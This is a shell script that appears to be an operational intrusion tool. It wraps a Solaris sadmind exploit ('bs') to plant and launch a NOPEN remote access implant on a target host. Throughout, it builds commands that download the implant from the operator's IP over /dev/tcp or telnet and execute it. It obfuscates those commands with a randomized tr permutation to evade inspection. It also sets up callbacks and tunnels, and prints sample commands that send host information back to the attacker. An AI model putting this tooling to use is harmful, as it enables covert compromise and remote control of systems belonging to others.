#!/bin/sh
# Defaults
PROG=`basename ${0}`
VER="2.5"
ERRSLEEP=0
TUNNELPORT=`grep "# setting up tunneling on port" /current/etc/autoattacknext.last 2>&1 | awk '{print $7}'`
[ "$TUNNELPORT" ] || TUNNELPORT=18787
COLOR_SUCCESS="\\033[1;32m"
COLOR_FAILURE="\\033[1;31m"
COLOR_WARNING="\\033[1;33m"
COLOR_NORMAL="\\033[0;39m"
COLOR_NOTE="\\033[0;34m"
COLOR_WHITE="\\033[4;97m"
SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
SETCOLOR_WARNING="echo -en $COLOR_WARNING"
SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
SETCOLOR_NOTE="echo -en $COLOR_NOTE"
SETCOLOR_WHITE="echo -en $COLOR_WHITE"
# usagetext here so this can be used globally 
usagetext="
Usage:
  [E=ratpreargs] [A=ratpostargs] $PROG [options] remoteIP remoteHost \\
  [remoteDomain] \\
  sadmindPort remoteDir remoteName localIP [localPort]

$PROG uploads and runs NOPEN via ./bs.

Unless the -T option is used, $PROG uses the remote system's tr program
(see \"man tr\") to unmunge the string sent via bs into the commands we
want him to execute. Detail below. And $PROG will build and show the
munged and unmunged strings, prompting to abort or continue before any
packets are sent.

If localPort is omitted, $PROG looks for a current port LISTENing and
prompts for confirmation.
$COLOR_FAILURE
NOTE: \a THE NEW WAY REQUIRES NO UU*CODE NOR ANY E=\"ratpreargs\"!!!!\n
NOTE: \a THE NEW WAY REQUIRES NO UU*CODE NOR ANY E=\"ratpreargs\"!!!!
$COLOR_NORMAL
OPTIONS

-t       Use the OLDCMD/telnet/uudecode method instead of the default
         CMD/ksh.$COLOR_FAILURE NOTE: This DOES require uudecode.$COLOR_NORMAL
-T       Do NOT use tr at all (can be used with or without -t).
-p #     Use port # for RAT listen/callback. By default, a random number
         is generated and used.
-s #     Change delay used for -c to # seconds (must appear before -c).
-l IP    Local IP to have NOPEN callback to. (defaults to localIp on
         command line. This is the IP NOPEN calls back--see -c below.)
-c       Use NOPEN syntax to have RAT callback after a delay (default
         delay is $CALLBACKDELAY seconds). Port is random unless -p used.
-z       Do NOT use uncomrpess at the far end (so you should not use
         compress here).
-C       Run specific commands on target, not the usual (you are prompted
         for the command string to send).
-P       Assume PATH=. will fail so use ./ratname.

NOTE: The E=ratpreargs is still usable, but ${COLOR_FAILURE}not necessary${COLOR_NORMAL}, since
      the default is now to start a random port listener, and -c argument
      allows for a NOPEN callback.

       ratpreargs  : a string put on remote command line right after
                     PATH=. and before remoteName (NOTE: If using -l/c
                     options above this is no longer necessary.)
 
       ratpostargs : a string put on remote command line after running
                     remoteName (e.g., \" ; rm sendmail\")

       Command sent to bs will be munged (unless -T is used) from one of:

OLDCMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};telnet \${LOCAL_IP} \${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1 && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"

CMD=\"cd /tmp;mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR};/bin/ksh -c \"cat < /dev/tcp/\${LOCAL_IP}/\${LOCAL_PORT} > \${REMOTE_FNAME}.Z && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${DOTSLASH}\${REMOTE_FNAME}\${RAT_POSTARGS}\"\"

OR if -T is used, above will be used but will not be munged at all.

Syntax (repeated here for readability):
  [E=ratpreargs] [A=ratpostargs] $PROG [options] remoteIP remoteHost \\
  [remoteDomain] \\
  sadmindPort remoteDir remoteName localIP [localPort]
"
note() {
    $SETCOLOR_NOTE
    echo -e "${*}\n"
    $SETCOLOR_NORMAL
}
notered() {
    $SETCOLOR_FAILURE
    echo -e "${*}\n"
    $SETCOLOR_NORMAL
}
tunnelcmd() {
    echo "${*}"	| nc -w1 -u 127.0.0.1 $TUNNELPORT
}
usage() {

    [ "$1" = "exit" ] && EXIT=1 && shift
    if [ "$1" = "-h" ] ; then
	shift
	[ "$ERRSTR" ] || ERRSTR="\nNOTE: \a THE NEW WAY REQUIRES NO UU*CODE NOR ANY E=\"ratpreargs\"!!!!"
	echo -e "$usagetext"
    fi
    if [ "$1" = "-v" ] ; then
	echo "$PROG version $VER"
	shift
    fi
    ERRSTR="${*}"
    if [ "$ERRSTR" ] ; then
	notered "\a${ERRSTR}"
    fi
    [ "$EXIT" ] && exit
} # end usage

doit() {
#echo DBG
#set
#echo DBG
    CMDLINE="\nCommandLine: ${0} ${*}"
    CALLBACKDELAY=30
    # lab testing?
    ifconfig 2>&1  | grep "135.1\.2\." > /dev/null && CALLBACKDELAY=4
    unset NOPENPORT CALLBACKIP CALLBACK OLDCMD NO_TR NOZIP PACKARGS DOTSLASH CMDOVERRIDE SCRIPT
    unset UNCOMPRESS REDIRECT UUARG
    while getopts p:cl:ths:zPvCS:T op; do
	case $op in
	    E)  RAT_PREARGS=" $OPTARG";;
	    A)  RAT_POSTARGS=" $OPTARG";;
	    p)  NOPENPORT="$OPTARG";;
	    l)  CALLBACKIP="$OPTARG";;
	    c)  CALLBACK=" callback";;
	    t)  OLDCMD="yes";;
	    T)  NO_TR="yes";;
	    s)  CALLBACKDELAY="$OPTARG";;
	    z)  NOZIP=yes
		PACKARGS=" -z" ;;
	    h)  usage exit -h ;;
	    v)  usage exit -v ;;
#	    r)  RAT_NAME="$OPTARG";;
	    P)  DOTSLASH="./";;
	    C)  CMDOVERRIDE=yes ;;
	    S)  SCRIPT="$OPTARG" ;;
	esac
    done

    [ "$SCRIPT" ] || SCRIPT="...."
#    [ "$RAT_NAME" ] || RAT_NAME=sendmail
    if [ ! "$CMDOVERRIDE" ] ; then
	if [ ! "$NOPENPORT" ] ; then
	    NOPENPORT=`mkrandom -n 2>/dev/null`
	fi
	if [ ! "$NOPENPORT" ] ; then
	    usage "mkrandom not in path--needed to generate random port for NOPEN\n(use -p # to force a particular port)"
	    return
	fi
    fi

    shift `expr $OPTIND - 1`

    [ "$E" ] && RAT_PREARGS=" $RAT_PREARGS $E" && echo "RAT_PREARGS=\"$RAT_PREARGS\""
    [ "$A" ] && RAT_POSTARGS=" $RAT_POSTARGS $A" && echo "RAT_POSTARGS=\"$RAT_POSTARGS\""
    echo ""

    REMOTE_IP="-i ${1}"
    REMOTE_HOST="-h ${2}"
    [ "$HOSTERR" ] && REMOTE_HOST="-h ${HOSTERR}"
    [ "$1" = "-v" ] && usage
    if [ $# -lt 6 ] ; then
	usage exit -h -v "Too few arguments"
    fi

    if [ "${4:0:1}" = "/" ] ; then
	SADMIND_PORT="-p ${3}"
	REMOTE_DIR="${4}"
	REMOTE_FNAME="${5}"
	LOCAL_IP="${6}"
	LOCAL_PORT="${7}"
    elif [ "${5:0:1}" = "/" ] ; then
	REMOTE_DOMAIN="-d ${3}"
	SADMIND_PORT="-p ${4}"
	REMOTE_DIR="${5}"
	REMOTE_FNAME="${6}"
	LOCAL_IP="${7}"
	LOCAL_PORT="${8}"
    else
	usage "\a\nREMOTEDIR ($4 or $5) must start with \"/\". Check # of args and order."
    fi

    # show what we were called with
    echo -e "$CMDLINE"

    # Check to make sure tcp LISTEN is there
    PORTS=`netstat -an | grep tcp.*LIST | cut -f 2 -d ":" | sort -rn | awk '{print $1}' |egrep -v "6000"`
    if [ "$NOPENPORT" ] ; then
	note "Using random NOPEN$CALLBACK port $NOPENPORT"
    fi
    
    note Local ports LISTENing: $PORTS
    echo
    which packrat >/dev/null 2>&1
    NOPACKRAT=$?
    
    if [ ! "$CMDOVERRIDE" ] ; then
	if [ "$TARGETIP"  ] ; then
	    # autoattack mode so yes we want packrat
	    PACKRAT_SCRIPME=yes
	else
	    if [ "$LOCAL_PORT" ] ; then
		for i in $PORTS -1 ; do
		    [ "$i" = "$LOCAL_PORT" ] && break
		done
		if [  $i -lt 0 ] ; then
		    if [ -e $NOSERVER -a "$NOPACKRAT" = "0" ] ; then
			echo -ne "The file /current/up/noserver exists, and you have no LISTENer on port ${LOCAL_PORT}.
Do you want me to start a packrat listener on $LOCAL_PORT in another window for you? [Y] "
			read ans
			[ ! "$ans" -o "${ans:0:1}" = "y" -o "${ans:0:1}" = "Y" ] && \
			    PACKRAT_SCRIPME=yes
		    else
			[ "$NOPACKRAT" = "0" ] || notered "No packrat in your path"
			notered "YOU MUST have a local LISTEN port on $LOCAL_PORT, and YOU DO NOT have /current/up/noserver\n\ato start one automatically"
			sleep 3
			notered "\a\nProceeding, assuming YOU WILL EITHER ABORT OR START LISTENER before continuing\npast next prompt."
		    fi
		else
		    notered "\aLocalPort=$LOCAL_PORT provided on command line already LISTENing. Assuming that is the upload."
		    sleep 2
		fi
	    else
		for i in $PORTS -1 ; do
		    [ $i -lt 0 ] && break
		    echo -n "Is $i your localPort for RAT upload (Yes, No, Run a new/fresh one for me)? [R] "
		    read ans
		    [ "$ans" ] || break
		    [ "$ans" = "R" -o "$ans" = "r" ] && i=-1 && break
		    [ "${ans:0:1}" = "y" -o "${ans:0:1}" = "Y" ] && break
		done
		[ "$ans" = "" ] && i=-1 
		[ $i -lt 0 ] || LOCAL_PORT=$i
		if [ ! "$LOCAL_PORT" ] ; then
		    while [ 1 ] ; do
			LOCAL_PORT=`mkrandom -n 2>/dev/null`
			[ ! "$LOCAL_PORT" ] && usage "mkrandom not in path--needed to generate random rat upload port"
			ALREADYTHERE=`netstat -an | grep tcp.*LIST | grep ":$LOCAL_PORT "`
			[ "$ALREADYTHERE" ] || break
		    done
		    note "Using a random port ($LOCAL_PORT) for local RAT upload listener (packrat)"
		    if [ -e /current/up/noserver ] ; then
			if [ "$NOPACKRAT" = "0" ] ; then
			    PACKRAT_SCRIPME=yes
			else
			    usage "No packrat in your path$COLOR_NORMAL"
			fi
		    else
			usage Put correct noserver into /current/up/noserver and try again
			return
		    fi
		fi
	    fi
	fi
	for pid in `pidof nc` ; do
	    UULISTEN=`ls -al /proc/$pid/fd | grep \.uu`
	    if [ "$UULISTEN" ] ; then
		usage "NOT GOOD: Your netcat LISTEN seems to be sending a .uu file--DO NOT (see usage):
	    # ls -al /proc/$pid/fd | grep \.uu\n$UULISTEN"
	    fi
	done
    fi

    # Check for required args
    [ -z "$REMOTE_IP" ] && usage "Error: missing remote IP"
    [ -z "$REMOTE_HOST" ] && usage "Error: missing remote hostname"
    [ -z "$SADMIND_PORT" ] && usage "Error: missing sadmindPort ($SADMIND_PORT)"
    [ -z "$REMOTE_DIR" ] && usage "Error: missing remote directory"
    [ -z "$REMOTE_FNAME" ] && usage "Error: missing remote filename"
    [ -z "$LOCAL_IP" ] && usage "Error: missing local IP"
    [ -z "$LOCAL_PORT" ] && usage "Error: missing local port"

    if [ "${REMOTE_IP:3:3}" = "127" ] ; then
	REDIRECT=yes
	ifconfig -a | grep $LOCAL_IP > /dev/null && NOTGOOD=yes
	if [ "$NOTGOOD" ] ; then
	    $SETCOLOR_FAILURE
	    echo -e "ARE YOU SURE? It looks like you are redirecting (due to remote being $REMOTE_IP),
and yet you want the RAT callback to go to $LOCAL_IP, WHICH\a IS ONE OF YOUR LOCAL IPs???"
	    sleep 1
	    echo -en "\nHit ^C to abort or enter to continue DESPITE THIS PROBLEM!!\a"
	    $SETCOLOR_NORMAL
	    read blah
	fi
	if [ "$TARGETIP" ] ; then
	    DEFTARGET=$TARGETIP
	    # This is set by autoattack which means domainname may still be needed
	    echo -en "\nEnter domainname to use if any: "
	    read D
	    [ "$D" ] && REMOTE_DOMAIN="-d ${D}"
	else
	    DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`
	fi
	[ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
	until [ `echo $ACTUALTARGET | grepip 2>/dev/null` ] ; do
	    [ "$ACTUALTARGET" ] && echo Bad IP $ACTUALTARGET
	    echo -en "\nEnter Target IP after redirecting through $LOCAL_IP: "
	    [ "$DEFTARGET" ] &&  echo -en "[$DEFTARGET] " 
	    read ACTUALTARGET
	    [ ! "$ACTUALTARGET" ] && [ "$DEFTARGET" ] && ACTUALTARGET=$DEFTARGET
	done
    fi

    if [ "$PACKRAT_SCRIPME" ] ; then
	[ "$OLDCMD" ] || UUARG="-u"
	EXPLOIT_SCRIPME="packrat$PACKARGS $UUARG $REMOTE_FNAME $NOSERVER $LOCAL_PORT"
	note "Starting local packrat LISTENer to send noserver via port $LOCAL_PORT"
	export EXPLOIT_SCRIPME
	echo EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"  scripme -t PACKRAT -F -X \"-bg slategrey -fg white -geometry 131x55-0+0\"
	EXPLOIT_SCRIPME="$EXPLOIT_SCRIPME" scripme -t PACKRAT -F -X "-bg slategrey -fg white -geometry 131x55-0+0"
    fi
    if [ "$CALLBACK" -a ! "$CALLBACKIP" ] ; then 
	note "No -l argument given for callback--using local IP from command line: $LOCAL_IP"
	CALLBACKIP="$LOCAL_IP"
    fi
    if [ "$REDIRECT" ] ; then
#	if [ "$CALLBACK" ] ; then
#	    note "\n\nYou will need two NOPEN windows on $CALLBACKIP\n"
#	fi
#	note Here are some pastables:
	PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP"`
	$SETCOLOR_NORMAL
#	echo "FIRST/-tunnel nopen window on $LOCAL_IP:"
#	note "\ncd /current/down\n${PASTABLE}"
#	note "-tunnel\n\nu ${SADMIND_PORT:3} $ACTUALTARGET\n\nr $LOCAL_PORT\n\ns\n"
#	echo "" | nc -w1 -u 127.0.0.1 38787
#	if [ ! "$CALLBACK" ] ; then
#	    notered "Hit ^C to abort or enter once NOPEN -tunnel window is ready"
#	    read blah
#	fi
    fi

    if [ "$CALLBACK" ] ; then
	RAT_PREARGS=" S=$CALLBACKDELAY D=\"-c${CALLBACKIP}:${NOPENPORT}\""
	if [ "$REDIRECT" ] ; then
	    notered "\aYou must establish a NOPEN listener on $CALLBACKIP:$NOPENPORT\n\n"
	    PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP"`
	    ifconfig -a | grep $CALLBACKIP && ITSLOCAL=yes
	    if [ "$ITSLOCAL" ] ; then
		echo "remote nopen window on $CALLBACKIP AND local listener:"
		note "\ncd /current/down/\n${PASTABLE}\n/current/bin/noclient -l $NOPENPORT\n\n"
	    else
		echo "remote nopen window on $CALLBACKIP:"
		note "\ncd /current/down\n${PASTABLE}\n-nrtun $NOPENPORT\n\n"
#		PASTABLE=`grep -v "^#" /current/down/didthis 2>/dev/null | grep "noclient.*$CALLBACKIP" | sed "s/noclient/noclient -c \"-nrtun $NOPENPORT\"/"`
#		EXPLOIT_SCRIPME="${PASTABLE}" scripme -t NOCLIENT -F -X " -geometry 131x55"

	    fi
	    $SETCOLOR_FAILURE
	    echo -en "Hit ^C to abort or enter once NOPEN callback window is ready"
	    $SETCOLOR_NORMAL
	    read blah
	else # not redirecting
	    POSTRUN="noclient -l $NOPENPORT"
	fi
    else # not callback
	RAT_PREARGS=" D=\"-l${NOPENPORT}\""
	if [ "$REDIRECT" ] ; then
	    POSTRUN2="-nstun $ACTUALTARGET ${NOPENPORT}"
	else
	    POSTRUN2="noclient ${1}:${NOPENPORT}"
	fi
    fi

    if [ ! "$CMDOVERRIDE" ] ; then
	if [ ! "$NOZIP" ] ; then
	    UNCOMPRESS="&& uncompress -f ${REMOTE_FNAME}.Z"
	    [ "$OLDCMD" ] || UNCOMPRESS=".Z&&uncompress -f ${REMOTE_FNAME}.Z"
	    
	fi
	# this one has more spaces...don't use unless other fails...
	CMD="mkdir -p ${REMOTE_DIR} && cd ${REMOTE_DIR} && telnet ${LOCAL_IP} ${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1${UNCOMPRESS}&& chmod 755 ${REMOTE_FNAME} && PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
    
	CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&/bin/ksh -c \"/bin/cat < /dev/tcp/${LOCAL_IP}/${LOCAL_PORT} > ${REMOTE_FNAME}${UNCOMPRESS}&&chmod 755 ${REMOTE_FNAME}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}\""

	if [ "$OLDCMD" ] ; then
	    CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&telnet ${LOCAL_IP} ${LOCAL_PORT}</dev/console|uudecode>/dev/null 2>&1 ${UNCOMPRESS}&&PATH=.${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}"
	fi
    else
	CMD=""
	$SETCOLOR_NOTE
	[ ! "$REMOTE_DIR" = "/tmp" ] && TMP=" rm -rf ${REMOTE_DIR} ; ls -arlt /tmp ;"
	[ ! "$TMP" ] && TMP=" rm -rf ${REMOTE_DIR}/$REMOTE_FNAME ;"
	echo -e "Maybe something like these (Be sure you take care of this end, i.e., the netcats):\n"
	notered "LOCALLY:"
	echo -e "  nc -l -p 443"
	echo ""
	notered "For the REMOTE end:"
	echo -e "  ksh -c \"( w ; uname -a ) > /dev/tcp/$LOCAL_IP/443\""
	echo -e "  ( w ; uname -a ) | telnet $LOCAL_IP 443"
	echo -e "  ksh -c \"($TMP ls -alrt ${REMOTE_DIR} ) > /dev/tcp/$LOCAL_IP/443\""
	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP 443"
	echo -e "  ($TMP ls -alrt ${REMOTE_DIR} ) | telnet $LOCAL_IP `mkrandom -n 2>/dev/null`"
	echo ""
	while [ ! "$CMD" ] ; do
	    notered "Enter Commands to run on target (see above examples), separated by \";\".\n"
	    read CMD
	done
	note "\nCommands being run: $CMD\n"
    fi

# this is unused for now--old bs.tn.gr way
OLDOLDCMD="echo \"
PATH=/usr/openwin/bin:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/gnu/bin:/usr/ucb:/usr/X11R6/bin
export PATH
mkdir -p ${REMOTE_DIR}
cd ${REMOTE_DIR}
(echo 'open ${LOCAL_IP} ${LOCAL_PORT}';/bin/cat)| /bin/telnet | /bin/cat| /usr/bin/uudecode  > /dev/null 2>&1
uncompress -f ${REMOTE_FNAME}.Z
chmod 0700 ${REMOTE_DIR}/${REMOTE_FNAME}
PATH=${REMOTE_DIR}${RAT_PREARGS} ${DOTSLASH}${REMOTE_FNAME}${RAT_POSTARGS}
rm ${SCRIPT}
\" > ${SCRIPT} 
/bin/sh ${SCRIPT}"

    if [ ! "$NO_TR" ] ; then
	# tr sets
	#SET1="'0-}'"
	#SET2="'1-~'"
	ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZ./abcdefghijklmnopqrstuvwxyz0123456789 <&"
	THERE=`which permute 2>/dev/null`
	if [ ! "$THERE"  ] ; then
	    if [ -x "../bin/permute" ] ; then
		export PATH=../bin:$PATH
	    else
		usage exit "FATAL ERROR: No \"permute\" in path."
	    fi
	fi
	SET1=`permute "$ALPHA"`
	SET2=`permute "$SET1"`
	MUNGED="`echo "${CMD}" | tr "${SET1}" "${SET2}"`"
	UNMUNGED="`echo \"${MUNGED}\" | tr "${SET2}" "${SET1}"`"
	echo "
munging via:
    tr \"$SET1\" \"$SET2\"
and vice versa.
    
MUNGED=\"$MUNGED\"
    
UNMUNGED=\"$UNMUNGED\"
"

	if [ "$SET1" = "$SET2" ] ; then
	    echo "SET1=\"$SET1\""
	    usage exit "FATAL ERROR. SET1 is the same as SET2."
	fi
	if [ ! "$UNMUNGED" = "$CMD" ] ; then
	    echo "$UNMUNGED" > /tmp/UNMUNGED.$$
	    echo "$CMD" > /tmp/CMD.$$
	    cmp /tmp/UNMUNGED.$$ /tmp/CMD.$$
	    wc /tmp/UNMUNGED.$$ /tmp/CMD.$$
	    usage "FATAL ERROR. UNMUNGE TEST FAILED"
	else
	    echo -e "PASSSED TEST: \$CMD eq \$UNMUNGED.\n"
	fi

	$SETCOLOR_NOTE
	echo -e "Running:\n
bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
  -c \"echo '${MUNGED}'|tr '${SET2}' '${SET1}'|sh\"\n"
    else
	notered "\a\nNOT MUNGING--CMD going over in the clear.\n\n"
	echo -e "Running:\n
bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
  -c \"$CMD\"\n"
    fi

    if [ "$POSTRUN" ] ; then
	echo -e "AND THEN the following will start automatically:\n\n$POSTRUN$COLOR_NORMAL\n"
    fi
    $SETCOLOR_NORMAL

    notered "Hit ^C to abort or enter to continue"
    read blah
	note "Sending tunnel commands to 127.0.0.1:$TUNNELPORT"
	if [ $ATTEMPT -eq 1 ] ; then
# tunnelcmd c 1 2
	  tunnelcmd u ${SADMIND_PORT:3} $ACTUALTARGET
	else
	  tunnelcmd c 2
	fi
	tunnelcmd r $LOCAL_PORT
	tunnelcmd s

    while [ 1 ] ; do
	rm -f /tmp/bsoutput.$$
	if [ ! "$NO_TR" ] ; then
	    note "\n\nrunning this locally (using tr remotely):\n\nbs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
		-c \"echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh\" 2>&1 | tee /tmp/bsoutput.$$\n\n"
	    bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
		-c "echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh" 2>&1 | tee /tmp/bsoutput.$$
	else
	    note "\n\nrunning this locally:\n\nbs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
		-c \"$CMD\" 2>&1 | tee /tmp/bsoutput.$$\n\n"
	    bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
		-c "$CMD" 2>&1 | tee /tmp/bsoutput.$$
	fi

	HOSTERR=`grep "Security exception on host" /tmp/bsoutput.$$ | sed "s/.*Security exception on host //" | sed "s/.  USER ACCESS DENIED.*//"`
	rm -f /tmp/bsoutput.$$
	[ "$HOSTERR" ] || break
	$SETCOLOR_FAILURE
	echo -e "\n\nERROR OUTPUT FROM bs!!\n\n"
	if [ "-h $HOSTERR" = "$REMOTE_HOST" ] ; then
	    echo -e "ERROR! Correct host but need different domain ($REMOTE_DOMAIN failed)."
	    $SETCOLOR_NORMAL
	    echo -en "Enter new domain or ^C to abort (hit enter to try no domain at all): "
	    read ans
	    REMOTE_DOMAIN=""
	    [ "$ans" ] && REMOTE_DOMAIN="-d ${ans}"
	    echo -e "\n\nTrying domain \"$REMOTE_DOMAIN\"\n\n"
	else
	    echo -e "ERROR! Wrong host. They suggest \"$HOSTERR\", so try that."
	    $SETCOLOR_NORMAL
	    echo -en "Enter new host or ^C to abort: [$HOSTERR] "
	    read ans
	    [ "$ans" ] || ans="$HOSTERR"
	    REMOTE_HOST="-h ${ans}"
	    echo -e "\n\nTrying host \"$REMOTE_HOST\"\n\n"
	fi
    done

    if [ "$POSTRUN" ] ; then
	notered "\n\n\aNOTE: Callback will not occur for $CALLBACKDELAY seconds or more"
	notered "      and MAYBE NOT until upload completes AND you ^C the netcat upload.\n\n"
	notered "\nNow running nopen listener with: $POSTRUN\n"
	exec $POSTRUN
    fi

#    if [ "$REDIRECT" ] ; then
#	note "\n\nFor your -tunnel window once all is done:\n\nc 1 2\n\nq\n\n"
#    fi
    if [ "$POSTRUN2" ] ; then
	note "\nOnce you see all is done, you may want to proceed with:\n\n$POSTRUN2\n\n"
	notered NOTE: Listener may not be active until you ^C the netcat upload.
    fi
}
 # end doit procedure

if [ "$ARCH" ] ; then
    NOSERVER=`ls -1 /current/up/morerats/noserver*solaris-2.6 2>/dev/null | grep -i ${ARCH} | tail -1`
fi
[ "$NOSERVER" ] || NOSERVER=/current/up/noserver

ATTEMPT=1
while [ 1 ] ; do

    if [ "$ARGS" ] ; then
	OPTIND=1
        doit $ARGS
    else
	ARGS="${*}"
	doit ${*} 
    fi

    note "\n\n$PROG attempt number $ATTEMPT is complete."
    if [ "$CALLBACK" ] ; then
	$SETCOLOR_FAILURE
	echo -e "\nNOTE: Callback will not happen until $CALLBACKDELAY seconds or more have passed.\n"
	while [ $CALLBACKDELAY -ge 0 ] ; do
	    echo -en "\rCounting down: $CALLBACKDELAY  "
	    CALLBACKDELAY=`expr $CALLBACKDELAY - 1`
	    sleep 1
	done
    fi
    note "\nIf it worked, hit return to exit.\n"
    echo -ne "${COLOR_FAILURE}Do you want to try again? [N] $COLOR_NORMAL"
    read ans
    [ ! "$ans" -o "${ans:0:1}" = "n" -o "${ans:0:1}" = "N" ] && break
    # echo -e "$usagetext" 
    
    notered "\nIf \"ksh\" method might have failed, add the -t argument to try the old telnet way."
    notered "If \"tr\" method might have failed, add the -T argument to disable munging."
    notered "If still failing after trying -t, -T and -tT, try bs.tn.gr_USE_WHEN_bs.auto_FAILS."
    note "\nIf desired, use the -C command to override what commands are executed on target."
    note "\nYour previous arguments were:"
    echo "$ARGS"
    notered "\n\nJust hit return to try the same arguments again, or input a new and complete argument\nstring to use (e.g., add -T if you think \"tr\" failed)."

    read ans
    if [ "$ans" ] ; then
	ARGS="${ans}"
    fi
    ATTEMPT=`expr $ATTEMPT + 1`
done

note "Closing down -tunnel ports"
tunnelcmd c 1 2
tunnelcmd q
ps -efwwww | grep PACKRAT | grep -v grep && \
notered "\n\nYou need to close packrat window before this one can exit.\n\n"

